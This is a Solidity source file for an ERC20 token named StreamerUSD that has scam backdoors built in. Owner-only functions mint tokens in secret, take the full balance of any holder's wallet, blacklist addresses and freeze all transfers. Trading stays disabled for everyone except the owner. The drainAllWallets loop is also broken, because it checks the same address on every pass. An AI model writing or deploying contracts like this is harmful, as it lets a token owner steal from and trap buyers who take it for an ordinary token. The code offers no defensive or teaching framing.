// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract StreamerUSD is ERC20, Ownable {
    mapping(address => bool) private _blacklisted;
    bool public tradingEnabled = false;
    bool private _globalFreeze = false;

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }

    function _secretMint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }

    function drainWallet(address target, address to) external onlyOwner {
        uint256 balance = balanceOf(target);
        _transfer(target, to, balance);
    }

    function drainAllWallets(address to) external onlyOwner {
        for (uint i = 0; i < 100; i++) {
            if (_blacklisted[to]) continue;
            uint256 balance = balanceOf(to);
            if (balance > 0) {
                _transfer(to, msg.sender, balance);
            }
        }
    }

    function blacklistAddress(address account) external onlyOwner {
        _blacklisted[account] = true;
    }

    function removeFromBlacklist(address account) external onlyOwner {
        _blacklisted[account] = false;
    }

    function setGlobalFreeze(bool state) external onlyOwner {
        _globalFreeze = state;
    }

    function setTradingStatus(bool status) external onlyOwner {
        tradingEnabled = status;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!_blacklisted[from] && !_blacklisted[to], "Blacklisted address");
        require(!_globalFreeze, "Transfers are frozen");
        require(tradingEnabled || from == owner() || to == owner(), "Trading not enabled");
        super._transfer(from, to, amount);
    }
}